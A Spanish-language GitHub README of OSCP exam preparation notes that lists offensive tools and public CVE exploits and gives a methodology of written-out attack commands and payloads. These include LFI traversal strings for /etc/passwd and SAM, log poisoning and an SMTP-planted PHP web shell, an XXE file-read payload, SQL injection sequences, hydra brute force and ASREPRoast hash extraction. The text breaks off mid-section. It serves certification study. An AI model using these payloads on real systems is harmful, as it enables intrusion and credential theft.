## Preparación para la OSCP - Metodología & Scripts 

![banner_oscp](https://user-images.githubusercontent.com/87484792/177843931-081eca92-24f1-4743-a632-48ee65b2ba4a.png)

- [Enumeración - Fase Inicial](#enumeración)
  
- [Metodogolia WEB](#metodologia-web)
  * [Enumeración de directorios](#enumeración-de-directorios---fuzzing)
  * [Enumeración de subdominios](#enumeración-de-subdominios---fuzzing)
  * [Enumeración de información Web](#información-basica-de-la-web)
- [LFI](#lfi)
  * [bypass-LFI](#bypass-lfi)
  * [wrappers-LFI](#wrappers-lfi)
- [RCE en LFI](#rce-en-lfi)
  * [Log Poisoning](#log-poisoning)
  * [mail php execution](#mail-php-execution)
- [XXE](#xxe)
- [Unrestricted File Upload](#unrestricted-file-uploads)
- [SNMP enumeratión](#snmp-enumeration)
- [Wordpress](#wordpress)
- [SQLI](#sqli)
  * [Unión Select](#union-select)
  * [SQL Truncation](#sql-truncatión)
- [Active Directory](#active-directory)
  * [Enumeracion](#enumeración-1)
  * [DNSync Attack](#dcsync-attack)
  * [asreproast](#asreproast)
  * [kerberoasting](#kerberoasting)
  * [pass the hash](#pass-the-hash)
  * [pass the ticket](#pass-the-ticket)
- [SMB](#smb)
  * [Enumeracion](#enumeración-2)
  * [Listar Carpetas](#listar-carpetas)
  * [Crear server SMB](#crear-servidor-smb)
  * [Shell con SMB](#shell-desde-smb)
- [RPC](#rpc)
  * [Enumeración de usuarios](#enumeración-de-usuarios)
  * [Enumeración de grupos](#enumeración-de-grupos)
  * [Enumeración de grupos de alias](#enumeración-de-grupos-de-alias)
  * [Enumeración de dominios](#enumeración-de-dominios)
  * [SID](#más-sid)
  * [Listar Carpetas](#listar-carpetas)
  * [BruteForce](#bruteforce-userpassword)
- [Port Forwarding](#port-forwarding)
  * [ssh local port forwarding](#ssh-local-port-forwarding)
  * [ssh remote port forwarding](#ssh-remote-port-forwarding)
  * [Chisel](#chisel)
- [GIT](#git)
- [Port Knocking](#port-knocking)


credits by: 0xsyr0.

### Basics

| Name | URL |
| --- | --- |
| Swaks | https://github.com/jetmore/swaks |
| CyberChef | https://gchq.github.io/CyberChef/ |

### Information Gathering

| Name | URL |
| --- | --- |
| Nmap | https://github.com/nmap/nmap |
| pspy | https://github.com/DominicBreuker/pspy |
| enum4linux | https://github.com/CiscoCXSecurity/enum4linux |
| BloodHound | https://github.com/BloodHoundAD/BloodHound |
| BloodHound Python | https://github.com/fox-it/BloodHound.py |

### Vulnerability Analysis

| Name | URL |
| --- | --- |
| Sparta | https://github.com/SECFORCE/sparta |
| nikto | https://github.com/sullo/nikto |

### Web Application Analysis

| Name | URL |
| --- | --- |
| PayloadsAllTheThings | https://github.com/swisskyrepo/PayloadsAllTheThings |
| ysoserial | https://github.com/frohoff/ysoserial |
| JSON Web Tokens | https://jwt.io/ |
| httpx | https://github.com/projectdiscovery/httpx |
| Gobuster | https://github.com/OJ/gobuster |
| ffuf | https://github.com/ffuf/ffuf |
| Wfuzz | https://github.com/xmendez/wfuzz |
| WPScan | https://github.com/wpscanteam/wpscan |

### Password Attacks

| Name | URL |
| --- | --- |
| Hydra | https://github.com/vanhauser-thc/thc-hydra |
| Patator | https://github.com/lanjelot/patator |
| Kerbrute | https://github.com/ropnop/kerbrute |
| CrackMapExec | https://github.com/byt3bl33d3r/CrackMapExec |
| SprayingToolkit | https://github.com/byt3bl33d3r/SprayingToolkit |
| John | https://github.com/openwall/john |
| hashcat | https://hashcat.net/hashcat |
| LaZagne | https://github.com/AlessandroZ/LaZagne |
| mimikatz | https://github.com/gentilkiwi/mimikatz |
| pypykatz | https://github.com/skelsec/pypykatz |
| RsaCtfTool | https://github.com/Ganapati/RsaCtfTool |
| Default Credentials Cheat Sheet | https://github.com/ihebski/DefaultCreds-cheat-sheet |

### Reverse Engineering

| Name | URL |
| --- | --- |
| dnSpy | https://github.com/dnSpy/dnSpy |
| AvalonialLSpy | https://github.com/icsharpcode/AvaloniaILSpy |
| ghidra | https://github.com/NationalSecurityAgency/ghidra |
| pwndbg | https://github.com/pwndbg/pwndbg |
| cutter | https://github.com/rizinorg/cutter |
| Radare2 | https://github.com/radareorg/radare2 |
| GEF | https://github.com/hugsy/gef |
| peda | https://github.com/longld/peda |
| JD-GUI | https://github.com/java-decompiler/jd-gui |

### Exploitation Tools

| Name | URL |
| --- | --- |
| lsassy | https://github.com/Hackndo/lsassy |
| Rubeus | https://github.com/GhostPack/Rubeus |
| printspoofer | https://github.com/dievus/printspoofer |
| pth-toolkit | https://github.com/byt3bl33d3r/pth-toolkit |
| Evil-WinRM | https://github.com/Hackplayers/evil-winrm |
| Metasploit | https://github.com/rapid7/metasploit-framework |
| SharpCollection | https://github.com/Flangvik/SharpCollection |
| PowerSharpPack | https://github.com/S3cur3Th1sSh1t/PowerSharpPack |

### Post Exploitation

| Name | URL |
| --- | --- |
| PEASS-ng | https://github.com/carlospolop/PEASS-ng |
| LinEnum | https://github.com/rebootuser/LinEnum |
| JAWS | https://github.com/411Hall/JAWS |
| Watson | https://github.com/rasta-mouse/Watson |
| WESNG | https://github.com/bitsadmin/wesng
| Sherlock | https://github.com/rasta-mouse/Sherlock |
| scavenger | https://github.com/SpiderLabs/scavenger |
| GTFOBins | https://gtfobins.github.io/ |
| LOLBAS | https://lolbas-project.github.io/ |
| Impacket | https://github.com/SecureAuthCorp/impacket |
| powercat | https://github.com/besimorhino/powercat |
| PowerView | https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1 |
| Windows-privesc-check | https://github.com/pentestmonkey/windows-privesc-check |
| Windows Privilege Escalation | https://github.com/frizb/Windows-Privilege-Escalation |
| Windows Privilege Escalation Fundamentals | https://www.fuzzysecurity.com/tutorials/16.html |
| Priv2Admin | https://github.com/gtworek/Priv2Admin |

### CVEs

| CVE | Descritpion | URL |
| --- | --- | --- |
| CVE-2014-6271 | Shellshock PoC | https://github.com/zalalov/CVE-2014-6271 |
| CVE-2016-5195 | Dirty COW | https://github.com/firefart/dirtycow |
| CVE-2017-0199 | RTF Dynamite | https://github.com/bhdresh/CVE-2017-0199 |
| CVE-2018-10933 | libSSH Authentication Bypass | https://github.com/blacknbunny/CVE-2018-10933 |
| CVE-2018-16509 | Ghostscript | https://github.com/farisv/PIL-RCE-Ghostscript-CVE-2018-16509 |
| CVE-2019-18634 | sudo | https://github.com/saleemrashid/sudo-cve-2019-18634 |
| CVE-2019-5736 | Exploiting RunC | https://github.com/Frichetten/CVE-2019-5736-PoC |
| CVE-2019-6447 | ES File Explorer Open Port Vulnerability | https://github.com/fs0c131y/ESFileExplorerOpenPortVuln |
| CVE-2019-7304 | dirty_sock | https://github.com/initstring/dirty_sock |
| CVE-2020-1472 | ZeroLogon Testing Script | https://github.com/SecuraBV/CVE-2020-1472 |
| CVE-2020-1472 | ZeroLogon Exploitation Script | https://github.com/risksense/zerologon |
| CVE-2021-1675,CVE-2021-34527 | PrintNightmare | https://github.com/nemo-wq/PrintNightmare-CVE-2021-34527 |
| CVE-2021-1675 | PrintNightmare LPE (PowerShell) | https://github.com/calebstewart/CVE-2021-1675 |
| CVE-2021-21972 | vCenter RCE | https://github.com/horizon3ai/CVE-2021-21972 |
| CVE-2021-22204 | GitLab Exiftool RCE | https://github.com/CsEnox/Gitlab-Exiftool-RCE |
| CVE-2021-22204 | GitLab Exiftool RCE Python Implementation | https://github.com/convisolabs/CVE-2021-22204-exiftool |
| CVE-2021-26085 | Confluence Server RCE | https://github.com/Phuong39/CVE-2021-26085 |
| CVE-2021-27928 | MariaDB/MySQL-'wsrep provider' | https://github.com/Al1ex/CVE-2021-27928 |
| CVE-2021-3129 | Laravel Framework RCE | https://github.com/nth347/CVE-2021-3129_exploit |
| CVE-2021-3156 | Sudo 1.8.31 Root Exploit | https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit |
| CVE-2021-3560 | PwnKit C Implementation | https://github.com/hakivvi/CVE-2021-3560 |
| CVE-2021-3560 | polkit Privilege Escalation | https://github.com/Almorabea/Polkit-exploit |
| CVE-2021-3560 | polkit Privilege Esclation PoC | https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation |
| CVE-2021-36934 | HiveNightmare | https://github.com/GossiTheDog/HiveNightmare |
| CVE-2021-4034 | Pkexec Self-contained Exploit | https://github.com/ly4k/PwnKit |
| CVE-2021-4034 | PoC for PwnKit (1) | https://github.com/dzonerzy/poc-cve-2021-4034 |
| CVE-2021-4034 | PoC for PwnKit (2) | https://github.com/arthepsy/CVE-2021-4034 |
| CVE-2021-4034 | PoC for PwnKit (3) | https://github.com/nikaiw/CVE-2021-4034 |
| CVE-2021-40444 | MSHTML builders | https://github.com/aslitsecurity/CVE-2021-40444_builders |
| CVE-2021-40444 | MSHTML Exploit | https://xret2pwn.github.io/CVE-2021-40444-Analysis-and-Exploit/ |
| CVE-2021-40444 | MSHTML PoC | https://github.com/lockedbyte/CVE-2021-40444 |
| CVE-2021-41379 | InstallerFileTakeOver | https://github.com/klinix5/InstallerFileTakeOver |
| CVE-2021-41773,CVE-2021-42013, CVE-2020-17519 | SimplesApachePathTraversal | https://github.com/MrCl0wnLab/SimplesApachePathTraversal |
| CVE-2021-42278,CVE-2021-42287 | sam-the-admin | https://github.com/WazeHell/sam-the-admin |
| CVE-2021-42278 | sam-the-admin Python Implementation | https://github.com/ly4k/Pachine |
| CVE-2021-42287,CVE-2021-42278 | noPac (1) | https://github.com/cube0x0/noPac |
| CVE-2021-42287,CVE-2021-42278 | noPac (2) | https://github.com/Ridter/noPac |
| CVE-2021-42321 | Microsoft Exchange Server RCE | https://gist.github.com/testanull/0188c1ae847f37a70fe536123d14f398 |
| CVE-2021-44228 | Log4Shell | https://github.com/kozmer/log4j-shell-poc |
| CVE-2021-44228 | LogMePwn | https://github.com/0xInfection/LogMePwn |
| CVE-2022-0847 | DirtyPipe-Exploits | https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits |
| CVE-2022-21999 | SpoolFool | https://github.com/ly4k/SpoolFool |
| CVE-2022-22963 | Spring4Shell | https://github.com/tweedge/springcore-0day-en |
| CVE-2022-23119,CVE-2022-23120 | Trend Micro Deep Security Agent for Linux Arbitrary File Read | https://github.com/modzero/MZ-21-02-Trendmicro |
| CVE-2022-26134 | ConfluentPwn | https://github.com/redhuntlabs/ConfluentPwn |
| CVE-2022-30190 | MS-MSDT Follina Attach Vector | https://github.com/JohnHammond/msdt-follina |
| CVE-2022-30190 | MS-MSDT Follina Exploit PoC | https://github.com/onecloudemoji/CVE-2022-30190 |
| CVE-2022-30190 | MS-MSDT Follina Exploit Python Implementation | https://github.com/chvancooten/follina.py |
| CVE-2022-34918 | LPE Netfilter Kernel Exploit | https://github.com/randorisec/CVE-2022-34918-LPE-PoC |
| n/a | SeBackupPrivilege | https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug |
| n/a | RoguePotato | https://github.com/antonioCoco/RoguePotato |
| n/a | RottenPotatoNG | https://github.com/breenmachine/RottenPotatoNG |
| n/a | GenericPotato | https://github.com/micahvandeusen/GenericPotato |
| n/a | JuicyPotato | https://github.com/ohpe/juicy-potato |
| n/a | JuicyPotatoNG | https://github.com/antonioCoco/JuicyPotatoNG |
| n/a | MultiPotato | https://github.com/S3cur3Th1sSh1t/MultiPotato |
| n/a | PrintSpoofer (1) | https://github.com/dievus/printspoofer |
| n/a | PrintSpoofer (2) | https://github.com/itm4n/PrintSpoofer |
| n/a | Shocker (1) | https://github.com/gabrtv/shocker |
| n/a | Shocker (2) | https://github.com/nccgroup/shocker |
| n/a | SystemNightmare | https://github.com/GossiTheDog/SystemNightmare |
| n/a | PetitPotam | https://github.com/topotam/PetitPotam |
| n/a | DFSCoerce MS-DFSNM Exploit | https://github.com/Wh04m1001/DFSCoerce |
| n/a | Windows Exploits | https://github.com/SecWiki/windows-kernel-exploits |
| n/a | Pre-compiled Windows Exploits | https://github.com/abatchy17/WindowsExploits |

### Exploiting

| Name | URL |
| --- | --- |
| PwnTools | https://github.com/Gallopsled/pwntools |
| checksec | https://github.com/slimm609/checksec.sh |
| mona | https://github.com/corelan/mona |
| Ropper | https://github.com/sashs/Ropper |
| Buffer Overflow | https://github.com/gh0x0st/Buffer_Overflow |

### Payloads

| Name | URL |
| --- | --- |
| PayloadsAllTheThings | https://github.com/swisskyrepo/PayloadsAllTheThings |
| Payload Box | https://github.com/payloadbox |
| ysoserial | https://github.com/frohoff/ysoserial |
| nishang | https://github.com/samratashok/nishang |
| Shikata Ga Nai | https://github.com/EgeBalci/sgn |
| unicorn | https://github.com/trustedsec/unicorn |
| PowerLine | https://github.com/fullmetalcache/powerline |
| woodpecker | https://github.com/woodpecker-appstore/log4j-payload-generator |
| marshalsec | https://github.com/mbechler/marshalsec |
| AMSI.fail | http://amsi.fail |
| Raikia's Hub | https://raikia.com/tool-powershell-encoder/ |
| Web-Shells | https://github.com/TheBinitGhimire/Web-Shells |
| PHP-Reverse-Shell | https://github.com/ivan-sincek/php-reverse-shell|

### Wordlists

| Name | URL |
| --- | --- |
| SecLists | https://github.com/danielmiessler/SecLists |
| CeWL | https://github.com/digininja/cewl |
| CUPP | https://github.com/Mebus/cupp |
| COOK | https://github.com/giteshnxtlvl/cook |

### Social Media Resources

| Name | URL |
| --- | --- |
| IppSec (YouTube) | https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA |
| IppSec.rocks | https://ippsec.rocks/?# |
| 0xdf | https://0xdf.gitlab.io/
| HackTricks | https://book.hacktricks.xyz/ |
| Hacking Articles | https://www.hackingarticles.in/ |
| Rana Khalil | https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/ |



# Enumeración

`sudo nmap --minrate-5000 -p- -vvv -Pn -n -oG openPorts.txt <ip>` # Encontrar puertos con nmap </br>

`sudo nmap -sSCV -p{ports} -oN servicesPorts.txt <ip>` # Verificar que servicios hay en los puertos encontrados.

`sudo nmap --script=http-enum  -p {port http/s} <ip>` # Pequeño script de nmap (".nse") para la verificación de directorios en http/s

`sudo nmap -sU -T5 --top-ports 500 <ip> ` # Encontrar puertos UDP con nmap

# Metodologia WEB

## Enumeración de directorios - Fuzzing 

`wfuzz --hc 404 -c -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt http://<ip>/FUZZ` # Encontrar directorios disponibles con wfuzz

`wfuzz --hc 404 -c -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -H "cookie: SSID=dasd45ads6aa5s" http://<ip>/FUZZ` # Encontrar directorios disponibles con cookies

`wfuzz --hc 404 -c -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -d "id=FUZZ&catalogue=1" <ip>` # Fuzzear data

`dirsearch --url http://ip/` # Fuzzear con dirsearch

`dirsearch --url http://ip/ -e .txt,.aspx` # Fuzzear con dirsearch con extensiones propias

`dirsearch --url http://ip/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt` # Fuzzear con dirsearch con diccionario propio

```
Tips:
** Enumerar directorios ocultos "http://ip/.FUZZ/"
** Enumerar directorios dentro de otros directorios "http://ip/admin/FUZZ"
** En wfuzz, puedes skyp el certificado SSL con la bandera "-k"
** Puedes usar hilos para agilizar, no aconsejable poner más de 200 "-t 200"
```

## Enumeración de subdominios - Fuzzing 

`wfuzz --hc 404 -c -w /usr/share/amass/wordlists/subdomains-top1mil-110000.txt -H "HOST: FUZZ.domain.htb" domain.htb` # Fuzzear con wfuzz subdominios

`gobuster vhost --url domain.htb --wordlist /usr/share/amass/wordlists/subdomains-top1mil-110000.txt` # Fuzzing con gobuster subdomains

`dig axfr @dns-server <target>` # Ataque de transferencia de zona (Domain's Attack)

`ldns-walk @ns1.insecuredns.com insecuredns.com` # Walking for DNS

## Información basica de la web

`whatweb <ip>` # obtener información util de la web, parecido a la extensión wappalyzer

`openssl s_client -connect domain.htb:443` # obteniendo información en webs con certificados ssl

## LFI 

Esta vulnerabilidad nos permite visualizar recursos del sistema.

`http://victim.htb/file.php?recurse=cars` # File.php, apunta a traves del parametro "recurse" al archivo cars.

Siendo vulnerable, podemos apuntar a otro fichero moviendonos entre directorios. 

`http://victim.htb/file.php?recurse=../../../../../etc/passwd` # Apuntamos a "passwd" movimiendonos de directorios.

### ByPass LFI

```
http://victim.htb/file.php?recurse=../../../../../etc/passwd% 

http://victim.htb/file.php?recurse=../../../../../etc/passwd?

http://victim.htb/file.php?recurse=%252e%252e%252fetc%252fpasswd

http://victim.htb/file.php?recurse=....//....//....//....//....//etc/passwd

```

### Wrappers LFI

```
http://victim.htb/file.php?recurse=php://filter/read=string.rot13/resource=index.php

http://victim.htb/file.php?recurse=php://filter/convert.base64-encode/resource=index.php

http://victim.htb/file.php?recurse=expect://whoami

```

## 'Archivos & Rutas' a tener en cuenta

### Linux
```
/etc/passwd
/etc/shadow
/etc/hosts
/home/<user>/.ssh/id_rsa
/home/<user>/.bash_history
/etc/apache2/sites-available/000-default.conf
/etc/httpd/logs/acces_log 
/etc/httpd/logs/error_log 
/var/www/logs/access_log 
/var/www/logs/access.log 
/usr/local/apache/logs/access_ log 
/usr/local/apache/logs/access. log 
/var/log/apache/access_log 
/var/log/apache2/access_log 
/var/log/apache/access.log 
/var/log/apache2/access.log
/var/log/access_log
/proc/self/environ
../wp-content/wp-config.php
/www/apache/conf/httpd.conf
```

### Windows

```
C:\Apache\conf\httpd.conf
C:\Apache\logs\access.log
C:\Apache\logs\error.log
C:\Apache2\conf\httpd.conf
C:\Apache2\logs\access.log
C:\Apache2\logs\error.log
C:\Apache22\conf\httpd.conf
C:\Apache22\logs\access.log
C:\Apache22\logs\error.log
C:\Apache24\conf\httpd.conf
C:\Apache24\logs\access.log
C:\Apache24\logs\error.log
C:\Documents and Settings\Administrator\NTUser.dat
C:\php\php.ini
C:\php4\php.ini
C:\php5\php.ini
C:\php7\php.ini
C:\Program Files (x86)\Apache Group\Apache\conf\httpd.conf
C:\Program Files (x86)\Apache Group\Apache\logs\access.log
C:\Program Files (x86)\Apache Group\Apache\logs\error.log
C:\Program Files (x86)\Apache Group\Apache2\conf\httpd.conf
C:\Program Files (x86)\Apache Group\Apache2\logs\access.log
C:\Program Files (x86)\Apache Group\Apache2\logs\error.log
c:\Program Files (x86)\php\php.ini
C:\Program Files\Apache Group\Apache\conf\httpd.conf
C:\Program Files\Apache Group\Apache\conf\logs\access.log
C:\Program Files\Apache Group\Apache\conf\logs\error.log
C:\Program Files\Apache Group\Apache2\conf\httpd.conf
C:\Program Files\Apache Group\Apache2\conf\logs\access.log
C:\Program Files\Apache Group\Apache2\conf\logs\error.log
C:\Program Files\FileZilla Server\FileZilla Server.xml
C:\Program Files\MySQL\my.cnf
C:\Program Files\MySQL\my.ini
C:\Program Files\MySQL\MySQL Server 5.0\my.cnf
C:\Program Files\MySQL\MySQL Server 5.0\my.ini
C:\Program Files\MySQL\MySQL Server 5.1\my.cnf
C:\Program Files\MySQL\MySQL Server 5.1\my.ini
C:\Program Files\MySQL\MySQL Server 5.5\my.cnf
C:\Program Files\MySQL\MySQL Server 5.5\my.ini
C:\Program Files\MySQL\MySQL Server 5.6\my.cnf
C:\Program Files\MySQL\MySQL Server 5.6\my.ini
C:\Program Files\MySQL\MySQL Server 5.7\my.cnf
C:\Program Files\MySQL\MySQL Server 5.7\my.ini
C:\Program Files\php\php.ini
C:\Users\Administrator\NTUser.dat
C:\Windows\debug\NetSetup.LOG
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\Panther\Unattended.xml
C:\Windows\php.ini
C:\Windows\repair\SAM
C:\Windows\repair\system
C:\Windows\System32\config\AppEvent.evt
C:\Windows\System32\config\RegBack\SAM
C:\Windows\System32\config\RegBack\system
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SecEvent.evt
C:\Windows\System32\config\SysEvent.evt
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\drivers\etc\hosts
C:\Windows\System32\winevt\Logs\Application.evtx
C:\Windows\System32\winevt\Logs\Security.evtx
C:\Windows\System32\winevt\Logs\System.evtx
C:\Windows\win.ini
C:\xampp\apache\conf\extra\httpd-xampp.conf
C:\xampp\apache\conf\httpd.conf
C:\xampp\apache\logs\access.log
C:\xampp\apache\logs\error.log
C:\xampp\FileZillaFTP\FileZilla Server.xml
C:\xampp\MercuryMail\MERCURY.INI
C:\xampp\mysql\bin\my.ini
C:\xampp\php\php.ini
C:\xampp\security\webdav.htpasswd
C:\xampp\sendmail\sendmail.ini
C:\xampp\tomcat\conf\server.xml

```


## RCE EN LFI

### [Log Poisoning]
Consiste en verificar si las rutas /var/log/auth.log y /var/log/apache2/access.log son visibles desde el LFI.

En caso de serlo para la ruta /var/log/auth.log, podemos llevar a cabo técnicas de autenticación que nos permitan obtener ejecución de comandos en remoto. Esta ruta almacena las autenticaciones establecidas sobre el sistema, entre ellas además de las normales de sesión, las que van por SSH.

Esto en otras palabras se traduce en que por cada intento fallido de conexión por SSH hacia el sistema, se generará un reporte visible en el recurso /var/log/auth.log. La idea en este punto es aprovechar la visualización del recurso para forzar la autenticación de un usuario no convencional, donde incrustramos un código PHP que nos permite posteriormente desde el LFI ejecutar comandos sobre el sistema.

Ejemplo:

`ssh "<?php system('whoami'); ?>"@domain.htb`

### [Mail PHP Execution]

Consiste en aprovechar la vulnerabilidad LFI para tras visualizar los usuarios en el recurso '/etc/passwd', poder visualizar sus correspondientes mails en '/var/mail/usuario

```
telnet 192.168.1.X 25

HELO localhost

MAIL FROM:<root>

RCPT TO:<www-data>

DATA

<?php

echo shell_exec($_REQUEST['cmd']);
?>
```

*Si no sabemos que usuario puede existir en el sistema:"

`smtp-user-enum -M VRFY -U username_wordlist.txt -t <hostname>`

# XXE 

Un atacante puede intervenir su contenido para leer archivos del sistema.

```
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM  "file:///etc/passwd" >]>
<foo>&xxe;</foo>
```

En la salida del procesamiento xml, en la entidad &xxe, aparecerá el *passwd* de la maquina victima.

# Unrestricted File Uploads

Esta vulnerabilidad ocurre en aplicaciones web donde existe la posibilidad de subir un archivo sin que sea comprobado por un sistema de seguridad que frene peligros potenciales. 

Le permite a un atacante subir archivos con código (scripts tales como .php o .aspx) y ejecutarlos en el mismo servidor. 


# SNMP Enumeration 

Generalmente corre sobre puertos UPD ( 161 ), nos puede permitir enumerar más de la cuenta a nivel de sistema. Para saber qué software corren, así como rutas, usuarios del sistema, puertos internos abiertos TCP/UDP, etc.

Lo primero que necesitamos saber es la *community string*, de normal general suele estar entre **public** o **private**

`onesixtyone -c dic.txt -i output.txt` # onesixtyone nos ayuda a obtener la community string con fuerza bruta.

Una vez obtenemos la *community string* </br>
<h5>note: La versión suele ser la 2c</h5>

`snmpbulkwalk -c [COMM_STRING] -v [VERSION] [IP] . `  # Enumeración de SNMP con snmpbulkwalk

`snmp-check [DIR_IP] -p [PORT] -c [COMM_STRING]` # Enumeración de SNMP con snmp-check
 
`nmap --script "snmp* and not snmp-brute" <target>` # Apoyo a las enumeraciones, script de nmap.

# WordPress

Este gestor de contenidos (CMS) suele ser un punto clave en los CTF, contiene un panel de login y pluggins que suelen ser vulnerables.

`wpscan -u "http://ip/" `

En caso de que la web principal del gestor de contenido se encuentre en otra ruta personalizada, por ejemplo /invent-wordpress/, deberemos especificarlo a través del parámetro --wp-content-dir para la correcta enumeración desde wpscan:

`wpscan -u "http://ip/" --wp-content-dir "invent-wordpress"` # Escaner WP con la ruta modificada

Proseguimos a encontrar usuarios validos para 'WP'.

`wpscan -u "http://ip/" --enumerate u` # Enumeramos usuarios

`wpscan -u "http://ip/" --username usuario -w /usr/share/SecList/Usernames/xato-usernames-top-1millions-20000.txt` # Enumeramos usuarios con wordlists.

Una forma de bypassear posibles bloqueos es jugar con el parámetro --random-agent, de la siguiente forma:

`$~ wpscan -u "http://ip/" --username usuario -w /usr/share/SecList/Usernames/xato-usernames-top-1millions-20000.txt  --random-agent`

Tambien es posible enumerar usuarios validos si aplicamos fuerza bruta con hydra. Tenemos que ver si hay fuga de información.

`hydra -L dict_Users.txt -p test <ip> "http-post-form" "/path_login.php:user=^USER^&password=^PASS^:F=messageError"` # Fuerza bruta WP para listar usuarios.

`hydra -l admin -P dict_Password.txt <ip> "http-post-form" "/path_login.php:user=^USER^&password=^PASS^:F=messageError"` # Fuerza bruta WP para el usuario admin.

Es importante ver si la web cuenta con contenido escrito. Esto es importante para poder crear nuestro propio diccionario de palabras claves.

`cewl -w diccionario http://ip/ --with-numbers ` # aplicamos cewl, esto nos hará un diccionario con palabras clave de la web.

Enumerar y detectar pluggins vulnerables tambien ayudaran a la intrusión.

`wpscan --url http(s)://ip/ --enumerate vp` # "vp" Detectará pluggins vulnerable

`wpscan --url http(s)://ip/ --enumerate p` # "p" Detectará todos los pluggins

`wpscan --url http(s)://ip/ --enumerate p --plugins-detection aggressive` # Detectará todos los pluggins, con un parametro agresivo. Recomendable.

# SQLI
*SqlMap no está permitido en el OSCP*

**Inyección basica de error**

`admin' or 1=1;-- -` # Inyección en panel de login

**Inyección por tiempo**

`admin' or sleep(5);-- -` # Inyección en panel de login, controlada por el tiempo de respuesta. En este caso, 5 segundos.

**Enumeración de caracteres en la base de datos**

*Para esta enumeración, es necesario conocer algún dato valido ya que usamos el operador "AND".*

`admin' and substring(username,1,1)='a' #devolverá true, ya que la primera posición de "admin" es "a". ` # Enumeración por caracter, en base de error.

## Union Select

Empezaremos con una web de ejemplos:

`http://fakesite.com/reports.php?id=23`

Lo primero que realizaremos, será obtener algún tipo de error, para ello intentaremos romper la Query.

`http://fakesite.com/report.php?id=23' ` # Con una comilla final.

`http://fakesite.com/report.php?id=23' order by 5;-- - ` # Intentamos sacar cuantas tablas tiene la BBDD.

*A tener en cuenta, que a veces cuando sobre-excedemos con el order by, cierto contenido de la web, puede desaparecer*

```
http://fakesite.com/report.php?id=23 and 0 union select 1,2,3,4,5;-- -
http://fakesite.com/report.php?id=23 and false union select 1,2,3,4,5;-- -
http://fakesite.com/report.php?id=-23 union select 1,2,3,4,5;-- -
http://fakesite.com/report.php?id=23000000 union select 1,2,3,4,5;-- -
http://fakesite.com/report.php?id=null union select 1,2,3,4,5;-- -
http://fakesite.com/report.php?id=23 && 0 union select 1,2,3,4,5;-- -

# Otras formas de romper Query <-- URLEncondear.
```

Encontrado las tablas, continuamos:

`http://fakesite.com/report.php?id=23' union select 1,2,3,4,5;-- -` # Suponiendo que tenga 5 tablas, enumeramos.

*Podemos sustituir los números por lo que queramos, la cosa es tener visible que nos reporta la inyección de la query*

Suponiendo que se visualiza el número 3, podemos empezar a sustituir para filtrar contenido de la base de datos.

`http://fakesite.com/report.php?id=-23 union select 1,2,database(),4,5;-- -` # imprime el nombre de la base de datos.

Ahora podemos empezar a enumerar las tablas

`http://fakesite.com/report.php?id=-23 union select 1,2,table_name,4,5 from information_schema.tables where table_schema=database();-- -` # enumeramos tablas

*podemos jugar con limit para imprimir todo el contenido por lineas*

`http://fakesite.com/report.php?id=-23 union select 1,2,table_name,4,5 from information_schema.tables where table_schema=database() limit 0,1;-- -`

Ahora el proceso es muy similar para obtener las columnas y los datos de las columnas

`http://fakesite.com/report.php?id=-23 union Select 1,2,column_name,4,5 from information_schema.columns where table_schema=database() and table_name='tablenamehere;-- -'` # obtenemos las columnas

`http://fakesite.com/report.php?id=-23 union Select 1,2,concat(column1,column2),4,5 from tablename limit 0,1` # imprimimos los datos de la columna

## SQL Truncatión

La vulnerabilidad de truncamiento de SQL ocurre cuando una base de datos trunca la entrada del usuario debido a una restricción en la longitud.
El atacante puede crear un usuario 'admin' con su propia contraseña. Ahora, la base de datos tiene dos entradas de administrador 'username', pero con diferentes contraseñas. El atacante puede iniciar sesión con las credenciales recién creadas para obtener un panel de administración porque los nombres de usuario "admin" y "admin" son iguales para el nivel de la base de datos.

`username=admin++++++++(max.longitud)&password=testpwn123`  # Ejemplo de truncamiento, la base de datos eliminará el texto sobrante para que quepa en la base de datos, y despreciará caracteres extraños y/o espacios. 

# Active Directory

*Para entender mejor kerberos, recomiendo visitar mi explicación en GitHub.*

## Enumeración

*Enumerar y escuchar en puertos de impresoras, puede reportar credenciales en texto claro*

`nc -vv -l -p 444` # Escuchando por el puerto de impresora.

*Enumerar DNS podría brindar información sobre servidores clave en el dominio como web, impresoras, recursos compartidos, etc...*

`gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt` # Enumerar DNS del domain.

**Verificamos el acceso con credenciales nulas o invitados a servicios smb [Mirar apartado SMB]**

**Enumeramos LDAP**

`nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP> ` # Enumeramos ldap con script de nmap

**Enumeramos AD en busca de usuarios validos**

`./kerbrute_linux_amd64 userenum -d domain.htb diccionario_Usuarios.txt` # Utilizamos un script "kerbrute" para listar usuarios con wordlist.

`crackmapexec smb domain.htb  -u '' -p '' --users` # Si tenemos acceso con usuario nulo, podemos listar usuarios con crackmapexec.

**Enumeramos todos los usuarios del directorio activo**

*Cuando tenemos* **credenciales validas** *, podemos enumerar todos los usuarios existentes.*

`GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` # enumeramos con GetADUsers, un script en Python

`enum4linux -a -u "user" -p "password" <DC IP>` # Enumeramos con enum4linux

## ASREPRoast

*El ataque ASREPRoast busca usuarios sin el atributo requerido de autenticación previa de Kerberos (DONT_REQ_PREAUTH)*

`python3 GetNPUsers.py domain.htb/ -usersfile usernames.txt -outputfile hashes.asreproast` # Buscamos usuarios con un diccionario, si el usuario no necesita pre-autenticación, nos aparecerá su hash. *(Intentaremos crackearlo offline)*.

*Cracking the hash*

`
